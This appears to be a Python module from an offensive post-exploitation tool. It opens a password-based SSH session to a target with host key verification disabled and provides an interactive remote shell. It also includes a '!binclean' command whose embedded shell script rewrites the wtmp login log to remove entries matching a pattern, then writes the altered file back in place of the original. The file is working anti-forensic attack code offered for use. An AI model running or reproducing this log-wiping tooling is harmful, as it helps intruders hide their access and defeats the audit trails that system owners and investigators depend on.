import os
import subprocess
import getpass
import tempfile
from datetime import datetime
from rich.console import Console

console = Console()

def ssh(target_ip, target_port, credential_username, credential_type, credential_value):
    username = credential_username
    cred_type = credential_type
    cred_value = credential_value

    if not all([target_ip, target_port, cred_type, cred_value]):
        console.print("[red]Missing required configuration or credential. Use 'show' to verify.[/red]")
        return

    if cred_type != "password":
        console.print(f"[red]SSH only supports password-based SSH in this function (got: {cred_type})[/red]")
        return

    socket_dir = os.path.join(tempfile.gettempdir(), f"cloak-{getpass.getuser()}")
    os.makedirs(socket_dir, mode=0o700, exist_ok=True)
    socket_path = os.path.join(socket_dir, "ssh.sock")

    console.print(f"[bold green]Starting SSH session to {username}@{target_ip}:{target_port}...[/bold green]")

    try:
        subprocess.run([
            "sshpass", "-p", cred_value,
            "ssh", "-M", "-S", socket_path, "-fnNT",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "PreferredAuthentications=password",
            "-o", "PubkeyAuthentication=no",
            f"{username}@{target_ip}", "-p", str(target_port)
        ], check=True)

        while True:
            cmd = input("shell > ").strip()
            if cmd in ["exit", "quit"]:
                break

            elif cmd.startswith("!binclean"):
                parts = cmd.split()
                if len(parts) != 3:
                    console.print("[red]Usage: !binclean <log_path> <pattern>[/red]")
                    continue
                log_path, pattern = parts[1], parts[2]
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

                remote_script = f"""
log_path='{log_path}'
pattern='{pattern}'
text_dump='/tmp/.wtmp.txt'
cleaned_text='/tmp/.wtmp_clean.txt'
cleaned_bin='/tmp/.wtmp_cleaned.bin'
backup="/tmp/.wtmp.bak.$(date +%Y%m%d_%H%M%S)"

cp "$log_path" "$backup"
utmpdump "$log_path" > "$text_dump"
awk -v p="$pattern" 'BEGIN {{ RS="\\n\\n"; ORS="\\n\\n" }} tolower($0) !~ tolower(p)' "$text_dump" > "$cleaned_text"
utmpdump -r "$cleaned_text" > "$cleaned_bin"

if ! utmpdump "$cleaned_bin" | grep -q "$pattern"; then
    cp "$cleaned_bin" "$log_path"
    echo "[+] Cleaned and restored $log_path"
else
    echo "[-] Cleaning failed; pattern still present."
fi

rm -f "$text_dump" "$cleaned_text" "$cleaned_bin"
"""
                subprocess.run([
                    "sshpass", "-p", cred_value,
                    "ssh", "-tt", "-S", socket_path,
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    f"{username}@{target_ip}", "-p", str(target_port),
                    remote_script
                ])

            else:
                subprocess.run([
                    "sshpass", "-p", cred_value,
                    "ssh", "-S", socket_path,
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    f"{username}@{target_ip}", "-p", str(target_port),
                    cmd
                ])

    finally:
        subprocess.run(["ssh", "-S", socket_path, "-O", "exit", f"{username}@{target_ip}"])

